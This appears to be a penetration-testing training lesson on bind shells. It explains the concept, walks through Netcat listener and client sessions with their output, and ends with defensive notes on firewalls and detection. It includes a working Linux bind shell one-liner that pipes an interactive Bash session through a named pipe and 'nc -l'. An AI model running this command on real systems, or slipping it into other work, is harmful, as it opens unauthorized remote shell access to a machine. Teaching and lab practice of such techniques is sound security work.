# Bind Shells

A bind shell is a connection model in which the target system starts a listener on a specified port and waits for the operator's attack box to connect inbound. This contrasts with a reverse shell, where the direction of the initial connection is inverted. Understanding how bind shells function at a fundamental level is essential groundwork before working in environments where network controls, firewalls, and other defensive mechanisms complicate delivery.

## What Is a Bind Shell?

In a bind shell scenario, the target acts as the server and the operator's attack box acts as the client. The operator connects directly to the target's IP address and open port to receive a shell session. Several practical constraints make bind shells less reliable than reverse shells in real engagements:

- A listener must already be running on the target, or the operator must find a way to start one remotely.
- Perimeter firewalls and NAT with PAT implementations on network edges commonly block arbitrary inbound connections, making this technique most viable on internal networks.
- Host-based OS firewalls on both Windows and Linux will likely block incoming connections not associated with trusted applications.
- The IP address, port, and tool selection must all align correctly for the connection to succeed.

**[GNU Netcat](https://en.wikipedia.org/wiki/Netcat)** is the standard tool for demonstrating and establishing bind shell connections. It operates over TCP, UDP, and Unix sockets; supports both IPv4 and IPv6; and can open and listen on sockets, function as a proxy, and handle text input and output. It is routinely described as the Swiss Army Knife of networking tools for these reasons.

## Practising with GNU Netcat

The following sequence demonstrates a basic Netcat TCP session between a target server and an attack box client. This is not yet a shell; it establishes the underlying connectivity model that a bind shell builds upon.

**No. 1: Server (target) starts a Netcat listener:**

```bash
nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
```

**No. 2: Client (attack box) connects to the listener:**

```bash
nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

**No. 3: Server confirms the inbound connection:**

```bash
nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!
```

**No. 4: Client sends a test message:**

```bash
nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
Hello Academy
```

**No. 5: Server receives the message:**

```bash
nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
Hello Academy
```

At this stage, only a Netcat TCP pipe exists. Text passes between both ends, but there is no interaction with the target operating system or file system.

## Establishing a Basic Bind Shell

To convert the Netcat session into a functional bind shell, the server-side command must attach a shell process to the TCP session using a named pipe, input and output redirection, and a pipeline:

**No. 1: Server binds a Bash shell to the TCP session:**

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

This sequence removes any existing named pipe at `/tmp/f`, creates a fresh FIFO pipe, feeds its output into an interactive Bash session, redirects stderr to stdout, and pipes the result through Netcat. Responses from the shell are written back into the FIFO, completing the bidirectional communication loop.

**No. 2: Client connects and receives the shell:**

```bash
nc -nv 10.129.41.200 7777

Target@server:~$
```

The operator now has interactive shell access to the target. The payload syntax used on the server side will differ depending on the target operating system; this example applies to Linux systems running Bash.

## Defensive Considerations

This exercise was conducted without any security controls in place, including NAT, hardware firewalls, web application firewalls, IDS, IPS, OS firewalls, endpoint protection, and authentication mechanisms. In a real environment, each of those layers represents a potential point of failure for bind shell delivery. Because bind shells rely on inbound connections, they are more readily detected and blocked by both perimeter and host-based firewall rules, even when standard ports are used for the listener. Reverse shells, which initiate outbound connections and blend more naturally with expected egress traffic, are the preferred technique in most operational contexts.
